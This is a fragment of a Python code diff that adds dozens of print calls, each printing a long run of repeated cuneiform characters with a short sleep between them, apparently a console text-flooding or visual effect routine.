+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+
 if __name__ == "__main__":
       main()
